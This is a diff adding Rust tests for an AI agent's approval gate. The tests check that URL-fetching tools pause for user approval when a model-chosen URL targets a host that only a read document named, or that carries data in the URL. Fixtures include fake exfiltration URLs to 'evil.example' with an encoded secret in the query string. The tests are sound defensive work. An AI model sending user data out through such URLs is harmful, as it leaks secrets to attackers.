@@ -2028,3 +2028,119 @@ async fn a_fetch_carrying_data_asks_even_for_a_named_host() {
     let (result, _) = paused_call(&app, session_id).await;
     assert_eq!(result["meta"]["action"], "web_fetch");
 }
+
+/// Each tool that fetches a URL the model chose waits like `web_fetch`: on a
+/// host only a document named, the turn pauses with the tool's own action,
+/// and the approval is once only.
+#[tokio::test(flavor = "multi_thread")]
+async fn url_tools_wait_for_approval_on_a_host_only_a_document_named() {
+    for (tool, input) in [
+        (
+            "web_article_save",
+            json!({ "url": "https://evil.example/post?d=c2VjcmV0" }),
+        ),
+        (
+            "save_image_asset",
+            json!({ "url": "https://evil.example/pixel.png?d=c2VjcmV0" }),
+        ),
+    ] {
+        let Fixture { app, .. } = app();
+        let session_id = new_session(&app).await;
+        let url = input["url"].as_str().unwrap_or_default().to_owned();
+        let base_url = fake_provider(vec![tool_call(tool, input), answer(&["Done."])]).await;
+        let lines = stream(
+            &app,
+            session_id,
+            &base_url,
+            json!({ "content": "Summarise my notes" }),
+        )
+        .await;
+        assert_closed_idle(&lines);
+        assert_eq!(turn_end(&lines)["reason"], "awaiting-approval", "{tool}");
+        let (result, asked) = paused_call(&app, session_id).await;
+        assert_eq!(asked["toolName"], tool);
+        assert_eq!(result["meta"]["kind"], "shell.approval", "{tool}");
+        assert_eq!(result["meta"]["action"], tool);
+        assert_eq!(result["meta"]["command"], format!("{tool} {url}"));
+        assert!(result["meta"].get("suggested").is_none(), "{tool}");
+        check_shell_approval_contract("request", &result["meta"]);
+        let call_id = asked["callId"].as_str().unwrap_or_default().to_owned();
+        let (status, body) = call(
+            &app,
+            "POST",
+            &format!("/agent/sessions/{session_id}/messages/stream"),
+            json!({
+                "content": "Approved", "hide_user_message": true,
+                "shell_approval": { "call_id": call_id, "decision": "allow_always" },
+                "runtime_model": { "provider_type": "custom", "model_name": "test-model", "base_url": base_url, "wire_api": "responses", "api_key": "k" },
+            }),
+        )
+        .await;
+        assert_eq!(status, 400, "{tool}: {}", String::from_utf8_lossy(&body));
+    }
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn url_tools_run_without_asking_for_a_host_the_person_named() {
+    for (tool, input) in [
+        (
+            "web_article_save",
+            json!({ "url": "https://blog.kition-test.invalid/post" }),
+        ),
+        (
+            "save_image_asset",
+            json!({ "url": "https://cdn.kition-test.invalid/cat.png" }),
+        ),
+    ] {
+        let Fixture { app, .. } = app();
+        let session_id = new_session(&app).await;
+        let base_url = fake_provider(vec![tool_call(tool, input), answer(&["Done."])]).await;
+        let lines = stream(
+            &app,
+            session_id,
+            &base_url,
+            json!({ "content": "Save what you find on kition-test.invalid" }),
+        )
+        .await;
+        assert_closed_idle(&lines);
+        assert_ne!(turn_end(&lines)["reason"], "awaiting-approval", "{tool}");
+        let events = session_events(&app, session_id).await;
+        assert!(
+            !events.iter().any(|event| event["type"] == "approval/asked"),
+            "{tool}: {events:?}"
+        );
+    }
+}
+
+#[tokio::test(flavor = "multi_thread")]
+async fn url_tools_carrying_data_ask_even_for_a_named_host() {
+    let data = "x1".repeat(150);
+    for (tool, url) in [
+        (
+            "web_article_save",
+            format!("https://kition-test.invalid/post?d={data}"),
+        ),
+        (
+            "save_image_asset",
+            format!("https://kition-test.invalid/{data}.png"),
+        ),
+    ] {
+        let Fixture { app, .. } = app();
+        let session_id = new_session(&app).await;
+        let base_url = fake_provider(vec![
+            tool_call(tool, json!({ "url": url })),
+            answer(&["Done."]),
+        ])
+        .await;
+        let lines = stream(
+            &app,
+            session_id,
+            &base_url,
+            json!({ "content": "Look at kition-test.invalid for me" }),
+        )
+        .await;
+        assert_eq!(turn_end(&lines)["reason"], "awaiting-approval", "{tool}");
+        let (result, _) = paused_call(&app, session_id).await;
+        assert_eq!(result["meta"]["action"], tool);
+    }
+}
